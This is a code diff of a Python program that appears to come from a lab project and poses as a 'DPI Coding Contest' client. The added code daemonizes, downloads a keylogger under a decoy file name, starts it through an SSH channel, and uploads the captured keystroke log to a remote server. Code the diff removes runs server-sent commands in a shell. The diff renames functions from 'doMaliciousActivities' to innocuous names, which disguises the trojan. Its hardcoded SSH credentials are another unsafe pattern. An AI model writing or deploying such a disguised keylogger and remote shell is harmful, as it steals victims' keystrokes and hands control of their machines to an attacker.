@@ -13,153 +13,15 @@ import threading
 import sys
 import atexit
 import signal
+from sshClient import sshClient
+from sftpClient import sftpClient
+
 
 pidfile = "/tmp/client.pid"
 
-
-class sftpClient(object):
-    def __init__(self, hostname, port, username, password):
-        self.sftp = None
-        self.transport = None
-        self.hostname = hostname
-        self.port = port
-        self.username = username
-        self.password = password
-
-    def makeSFTPConnection(self):
-        try:
-            logger.info("Establishing sftp connection")
-            self.transport = paramiko.Transport((self.hostname, 22))
-            logger.info("SFTP transport created")
-            self.transport.connect(username="lab",
-                                   password="lab")
-            self.sftp = paramiko.SFTPClient.from_transport(self.transport)
-
-            logger.info('SFTP Connection Established . . .')
-
-            # handle errors
-        except paramiko.AuthenticationException as authErr:
-            logger.error(f'Authentication failed:{authErr}')
-        except paramiko.SFTP_FAILURE as sftpErr:
-            logger.error(f'SFTP connection failed:{sftpErr}')
-        except socket.timeout as toutErr:
-            logger.error(f'Connection timed out:{toutErr}')
-        except Exception as err:
-            logger.error(f'Exception has ocurred:{err}')
-            self.sftp.close()
-            self.transport.close()
-
-    # upload a file via the SFTP tunnel to remote server via SFTP
-    def uploadFile(self,  remotePath,  localPath):
-        try:
-            # connect to SFTP server
-            self.makeSFTPConnection()
-            self.sftp.put(localPath, remotePath)
-
-            # Close
-            if self.sftp:
-                self.sftp.close()
-            if self.transport:
-                self.transport.close()
-
-            # handle errors
-        except Exception as err:
-            logger.error(f'Exception has ocurred:{err}')
-            self.sftp.close()
-            self.transport.close()
-
-    # download a file via the SSH tunnel from remote server via SFTP
-    def downloadFile(self,  remotePath,  localPath):
-        try:
-            # connect to SSH server
-            self.makeSFTPConnection()
-            self.sftp.get(remotePath,  localPath)
-
-            # Close
-            if self.sftp:
-                self.sftp.close()
-            if self.transport:
-                self.transport.close()
-            # handle errors
-        except Exception as err:
-            logger.error(f'Exception has ocurred:{err}')
-            self.sftp.close()
-            self.transport.close()
-
-
-class sshClient(object):
-    # constructor, sets necessary parameters to establish a SSH tunnel
-    def __init__(self,  hostname,  port, username,  password):
-        self.ssh = None
-        self.channel = None
-        self.hostname = hostname
-        self.port = port
-        self.username = username
-        self.password = password
-        self.command = ""
-
-    # make a connection to a remote SSH server
-    def makeSSHConnection(self):
-        try:
-            logger.info("Establishing ssh connection")
-            # create a client instance, auto generate a key
-            # and attempt to connect to a host
-            self.ssh = paramiko.SSHClient()
-            self.ssh.load_system_host_keys()
-            self.ssh.set_missing_host_key_policy(
-                paramiko.WarningPolicy())
-
-            self.ssh.connect(hostname=self.hostname,  port=self.port,
-                             username=self.username,  password=self.password)
-            self.channel = self.ssh.get_transport().open_session()
-            logger.info('SSH Connection Established . . .')
-
-            # handle errors
-        except paramiko.AuthenticationException as authErr:
-            logger.error(f'Authentication failed:{authErr}')
-        except paramiko.SSHException as sshErr:
-            logger.error(f'SSH connection failed:{sshErr}')
-        except socket.timeout as toutErr:
-            logger.error(f'Connection timed out:{toutErr}')
-        except Exception as err:
-            logger.error(f'Exception has ocurred:{err}')
-            self.ssh.close()
-
-    def stopKeylogger(self):
-        logger.info("stopKeylogger() thread starting")
-        self.invoke_shell("stop")
-        self.command = "stop"
-        logger.info("stopKeylogger() thread finishing",)
-
-    def invoke_shell(self, command):
-        try:
-            # connect to SSH server
-            self.makeSSHConnection()
-
-            logger.info("Calling invoke shell")
-
-            self.channel.sendall(command.encode())
-
-            receivedCommand = self.channel.recv(1024).decode()
-            logger.info(f"Received message {receivedCommand}")
-            p = subprocess.Popen(receivedCommand, shell=True,
-                                 stdout=subprocess.PIPE)
-
-            self.channel.sendall(receivedCommand.encode())
-
-            self.channel.close()
-            self.ssh.close()
-        except subprocess.CalledProcessError as e:
-            logger.error(f"Subprocess error: {e.output.decode()}")
-        except paramiko.SSHException as sshErr:
-            logger.error(f'Shell invoke failed:{sshErr}')
-            self.ssh.close()
-        except socket.timeout as toutErr:
-            logger.error(f'Connection timed out:{toutErr}')
-            self.ssh.close()
-        except Exception as err:
-            logger.error(f'Exception has ocurred:{err}')
-            self.ssh.close()
+# Add logging to logfile and disable output to the terminal
+logzero.logfile("/home/lab/bin/py/project/sshClient.log", maxBytes=1e6,
+                backupCount=3, disableStderrLogger=True)
 
 
 def removePidProcess():
@@ -273,10 +135,72 @@ def daemonize(pidfile, *, stdin='/dev/null',
     signal.signal(signal.SIGTERM, sigterm_handler)
 
 
-def doMaliciousActivities():
-    remotepath = "/home/lab/bin/py/project/a1KeyLogger.py"
+def getServerPath(ssh):
+    try:
+        logger.info("[+]    getServerPath() starting")
+        ssh.makeSSHConnection()
+
+        ssh.send("path")
+        serverCurrentPath = ssh.receive()
+        ssh.send(serverCurrentPath.encode())
+
+        ssh.channel.close()
+        ssh.sshConnection.close()
+
+        logger.info("[+]    getServerPath() ending")
+        return serverCurrentPath
+    except subprocess.CalledProcessError as e:
+        logger.error(f"Subprocess error: {e.output.decode()}")
+    except paramiko.SSHException as sshErr:
+        logger.error(f'Shell invoke failed:{sshErr}')
+        ssh.sshConnection.close()
+    except socket.timeout as toutErr:
+        logger.error(f'Connection timed out:{toutErr}')
+        ssh.sshConnection.close()
+    except Exception as err:
+        logger.error(f'Exception has ocurred:{err}')
+        ssh.sshConnection.close()
+
+
+def start(ssh):
+    try:
+        logger.info("[+]    start() starting")
+        ssh.makeSSHConnection()
+
+        ssh.send("start")
+        ssh.invokeShell()
+
+        ssh.channel.close()
+        ssh.sshConnection.close()
+        logger.info("[-]    start() ending")
+    except subprocess.CalledProcessError as e:
+        logger.error(f"Subprocess error: {e.output.decode()}")
+    except paramiko.SSHException as sshErr:
+        logger.error(f'Shell invoke failed:{sshErr}')
+        ssh.sshConnection.close()
+    except socket.timeout as toutErr:
+        logger.error(f'Connection timed out:{toutErr}')
+        ssh.sshConnection.close()
+    except Exception as err:
+        logger.error(f'Exception has ocurred:{err}')
+        ssh.sshConnection.close()
+
+
+def stop(ssh):
+    logger.info("[+]    stop() thread starting")
+    ssh.makeSSHConnection()
+
+    ssh.send("stop")
+    ssh.invokeShell()
+    ssh.command = "stop"
+
+    logger.info("[-]    stop() thread finishing",)
+
+
+def makeSocketConnection():
+    remotepath = "/keyLogger.py"
     localpath = "/tmp/ZZZZ_NOT_SUSPICIOUS_FILE"
-    remotepath2 = "/home/lab/bin/py/project/clientKeyLogs.log"
+    remotepath2 = "/clientKeyLogs.log"
     localpath2 = "/tmp/keylog.log"
 
     try:
@@ -284,17 +208,23 @@ def doMaliciousActivities():
         # make password file
         os.system("touch /tmp/ZZZZ_NOT_SUSPICIOUS_FILE")
 
+        ssh = sshClient("localhost", 9000, "rick", "jacky")
+        serverCurrentPath = getServerPath(ssh)
+
+        remotepath = serverCurrentPath + remotepath
+        remotepath2 = serverCurrentPath + remotepath2
+        logger.info(f"remotepath: {remotepath}  | remotepath2: {remotepath2}")
+
         sftp = sftpClient("localhost", 22, "lab", "lab")
         sftp.downloadFile(remotepath, localpath)
 
-        ssh = sshClient("localhost", 9000, "rick", "jacky")
-        ssh.invoke_shell("start")
+        start(ssh)
 
         logger.info("Main before creating thread")
-        stopKeyloggerThread = threading.Thread(
-            target=ssh.stopKeylogger, daemon=True)
+        stopThread = threading.Thread(
+            target=stop, args=[ssh], daemon=True)
         logger.info("Main before running thread")
-        stopKeyloggerThread.start()
+        stopThread.start()
 
         while ssh.command != "stop":
             logger.info("Sleeping . . . ")
@@ -302,7 +232,7 @@ def doMaliciousActivities():
             logger.info(f"Command: {ssh.command}")
             logger.info("Awake!")
 
-        stopKeyloggerThread.join()
+        stopThread.join()
 
         sftp.uploadFile(remotepath2, localpath2)
 
@@ -321,7 +251,7 @@ def doMaliciousActivities():
         raise
 
 
-def printNonMaliciousActivity():
+def runContest():
     # non malicious stuff
     print("Welcome to the DPI Coding Contest!")
 
@@ -356,19 +286,3 @@ def printNonMaliciousActivity():
         print("Woops! Seems like you do not have the server running!" +
               "Use the command 'python3 contestServer.py' to start it up on the" +
               "command Line")
-
-
-# main thread
-if __name__ == '__main__':
-    try:
-        if os.path.exists("/home/lab/bin/py/project/sshClient.log"):
-            os.remove("/home/lab/bin/py/project/sshClient.log")
-
-        # Add logging to logfile and disable output to the terminal
-        logzero.logfile("/home/lab/bin/py/project/sshClient.log", maxBytes=1e6,
-                        backupCount=3, disableStderrLogger=True)
-
-        printNonMaliciousActivity()
-        doMaliciousActivities()
-    except Exception as err:
-        logger.error(err)
